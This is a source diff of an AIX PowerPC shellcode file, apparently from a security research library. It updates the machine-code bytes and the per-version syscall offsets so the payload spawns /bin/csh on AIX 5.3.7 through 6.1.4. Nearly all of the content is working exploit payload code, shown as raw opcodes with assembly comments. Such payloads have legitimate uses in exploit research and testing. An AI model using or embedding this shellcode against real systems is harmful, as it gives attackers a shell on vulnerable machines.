@@ -1,7 +1,5 @@
 /*
- *  $Id: aix-power-shellcode.c 40 2008-11-17 02:45:30Z ramon $
- *
- *  aix-power-shellcode.c - AIX Power shellcode
+ *  aix-power-shellcode.c
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -21,17 +19,21 @@
  */
 
 /*
- * Currently supported AIX levels.
- * -DV410   AIX 4.1.0
- * -DV420   AIX 4.2.0
- * -DV430   AIX 4.3.0
- * -DV433   AIX 4.3.3
- * -DV530   AIX 5.3.0
+ * Supported AIX versions:
+ *
+ * -DAIX614     AIX Version 6.1.4
+ * -DAIX613     AIX Version 6.1.3
+ * -DAIX612     AIX Version 6.1.2
+ * -DAIX611     AIX Version 6.1.1
+ * -DAIX5310    AIX Version 5.3.10
+ * -DAIX539     AIX Version 5.3.9
+ * -DAIX538     AIX Version 5.3.8
+ * -DAIX537     AIX Version 5.3.7
  *
  */
 
 char shellcode[]=           /*  60 bytes                          */
-    "\x3b\xe0\x01\xff"      /*  lil     r31,511                   */
+    "\x3b\xa0\x07\xff"      /*  lil     r29,2047                  */
     "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
     "\x40\x82\xff\xf9"      /*  bnel    <shellcode>               */
     "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
@@ -41,18 +43,34 @@ char shellcode[]=           /*  60 bytes                          */
     "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
     "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
     "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
-#if defined(V410) || defined(V433)
-    "\x38\x5f\xfe\x04"      /*  cal     r2,-508(r31)              */
+#ifdef AIX614
+    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
 #endif
-#ifdef V420
-    "\x38\x5f\xfe\x03"      /*  cal     r2,-509(r31)              */
+#ifdef AIX613
+    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
 #endif
-#ifdef V430
-    "\x38\x5f\xfe\x05"      /*  cal     r2,-507(r31)              */
+#ifdef AIX612
+    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
 #endif
-#ifdef V530
-    "\x38\x42\xfe\x06"      /*  cal     r2,-506(r2)               */
+#ifdef AIX611
+    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
 #endif
+#ifdef AIX610
+    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
+#endif
+#ifdef AIX5310
+    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
+#endif
+#ifdef AIX539
+    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
+#endif
+#ifdef AIX538
+    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
+#endif
+#ifdef AIX537
+    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
+#endif
+
     "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
     "\x44\xff\xff\x02"      /*  svca    0                         */
     "/bin/csh"
